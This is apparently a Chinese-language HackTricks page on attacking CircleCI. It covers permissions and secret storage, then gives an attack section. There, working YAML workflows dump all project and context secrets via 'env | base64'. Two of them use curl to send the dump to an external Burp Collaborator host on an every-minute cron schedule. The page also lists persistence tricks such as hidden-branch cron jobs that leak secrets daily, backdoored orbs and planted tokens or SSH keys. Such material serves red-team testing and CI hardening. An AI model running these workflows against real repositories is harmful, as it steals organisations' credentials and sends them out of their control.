# CircleCI 安全性

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为英雄级人物，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) 是一个持续集成平台，您可以在其中**定义模板**，指示它何时以及如何处理一些代码。这样，您可以直接**从您的仓库主分支**自动化测试或部署。

## 权限

**CircleCI** **继承了**与登录账户相关的 github 和 bitbucket 的权限。\
在我的测试中，我检查了只要您在 github 上对仓库有**写权限**，您就能够**管理 CircleCI 中的项目设置**（设置新的 ssh 密钥，获取项目 api 密钥，创建带有新 CircleCI 配置的新分支...）。

然而，您需要是一个**仓库管理员**才能**将仓库转换为 CircleCI 项目**。

## 环境变量和秘密

根据[**文档**](https://circleci.com/docs/2.0/env-vars/)，在工作流中有不同的方式来**加载环境变量中的值**。

### 内置环境变量

CircleCI 运行的每个容器将始终具有[**文档中定义的特定环境变量**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)，如 `CIRCLE_PR_USERNAME`、`CIRCLE_PROJECT_REPONAME` 或 `CIRCLE_USERNAME`。

### 明文

您可以在**命令**中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
你可以在**运行环境**中以明文声明它们：
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
你可以在**构建作业环境**中明文声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
你可以在**容器的环境**中以明文声明它们：
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### 项目密钥

这些是**密钥**，只能被**项目**（**任何分支**）**访问**。\
您可以在 _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ 中看到它们的**声明**。

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**导入变量**" 功能允许将**其他项目的变量导入**到此项目中。
{% endhint %}

### 上下文密钥

这些是**组织范围内**的密钥。默认情况下，**任何仓库**都能够访问存储在此处的**任何密钥**：

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
然而，请注意，可以**选择不同的组**（而不是所有成员），**只允许特定人员访问密钥**。\
这目前是**提高密钥安全性**的最佳方法之一，不允许所有人访问，而只允许某些人访问。
{% endhint %}

## 攻击

### 搜索明文密钥

如果您有**访问VCS**（如github）的权限，请检查**每个仓库的每个分支**上的文件 `.circleci/config.yml`，并**搜索**可能存储在其中的**明文密钥**。

### 密钥环境变量和上下文枚举

检查代码，您可以找到在每个 `.circleci/config.yml` 文件中被**使用**的**所有密钥名称**。您还可以从这些文件中获取**上下文名称**，或者在网络控制台中检查它们：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### 泄露项目密钥

{% hint style="warning" %}
为了**泄露所有**项目和上下文**密钥**，您**只需**对整个github组织中的**任何一个仓库**拥有**写**权限（_并且您的账户必须有权访问上下文，但默认情况下每个人都可以访问每个上下文_）。
{% endhint %}

{% hint style="danger" %}
"**导入变量**" 功能允许将**其他项目的变量导入**到此项目中。因此，攻击者可以**导入所有仓库的所有项目变量**，然后**一起泄露所有变量**。
{% endhint %}

所有项目密钥始终设置在作业的环境变量中，因此只需调用 env 并将其以 base64 形式混淆，就可以在**工作流网络日志控制台**中泄露密钥：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
如果您**无法访问网络控制台**，但您**可以访问仓库**，并且您知道正在使用CircleCI，您可以简单地**创建一个工作流程**，该工作流程**每分钟触发一次**，并且将**泄露的秘密发送到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### 泄露上下文密钥

您需要**指定上下文名称**（这也将泄露项目密钥）：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
如果您**无法访问网络控制台**，但您**可以访问仓库**，并且您知道正在使用CircleCI，您可以简单地**修改一个工作流**，该工作流**每分钟触发一次**，并且**将秘密数据泄露到外部地址**：
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
仅在仓库中创建一个新的 `.circleci/config.yml` **并不足以触发 circleci 构建**。您需要在 circleci 控制台中**将其启用为项目**。
{% endhint %}

### 逃逸到云端

**CircleCI** 允许您选择在**他们的机器或您自己的机器上运行构建**。\
默认情况下，他们的机器位于 GCP，起初您可能找不到任何相关信息。然而，如果受害者在**他们自己的机器上运行任务（可能在云环境中）**，您可能会发现一个带有有趣信息的**云元数据端点**。

请注意，在前面的例子中，一切都是在 docker 容器内启动的，但您也可以**请求启动一个 VM 机器**（可能拥有不同的云权限）：
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
或者是一个可以访问远程docker服务的docker容器：
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 持久性

* 可以在 CircleCI 中**创建用户令牌**以使用用户访问权限访问 API 端点。
* _https://app.circleci.com/settings/user/tokens_
* 可以**创建项目令牌**以使用赋予令牌的权限访问项目。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* 可以向项目中**添加 SSH 密钥**。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 可以在一个意料之外的项目中的隐藏分支**创建一个 cron 作业**，该作业每天都会**泄露**所有**上下文环境变量**。
* 或者甚至在一个分支中创建/修改一个已知作业，它将每天**泄露**所有上下文和**项目秘密**。
* 如果你是 github 拥有者，你可以**允许未验证的 orbs** 并配置一个作为**后门**的作业。
* 你可以在某个任务中找到一个**命令注入漏洞**并通过修改其值**注入命令**。

<details>

<summary><strong>从零开始学习 AWS 黑客技术直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果你想在 HackTricks 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧**。

</details>
